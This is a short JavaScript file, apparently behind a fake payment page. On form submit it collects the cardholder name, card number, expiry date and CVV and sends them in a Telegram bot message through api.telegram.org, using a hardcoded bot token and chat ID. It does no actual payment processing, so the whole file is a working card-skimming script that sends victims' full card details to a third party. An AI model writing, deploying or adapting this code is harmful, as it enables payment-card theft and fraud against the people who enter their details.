let form = document.querySelector("#form");

let bot = {
	TOKEN: "1964842037:AAHsNdGTw7z3i8N3dcdqMSZuaq5BvZ44AxI",
	chatID: "-1001571702765",
}

form.addEventListener("submit", e => {
	e.preventDefault();
	
	var number = document.getElementById("inputCardNumber").value;
	var month = document.getElementById("inputMonth").value;
	var year = document.getElementById("inputYear").value;
	var cvc = document.getElementById("inputCVV").value;
	var name = document.getElementById("inputName").value;
	
	var my_text = `Card Details:%0A - Card Holder Name: ${name} %0A - Card Number: ${number} %0A - Expiry: ${month} / ${year} %0A - CVV: ${cvc}`
	
	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
		method: "GET"
	})
	.then(success => {
		alert("Message send successfully!")
	}, error => {
		alert("Message not send!")
		console.log(error);
	})
})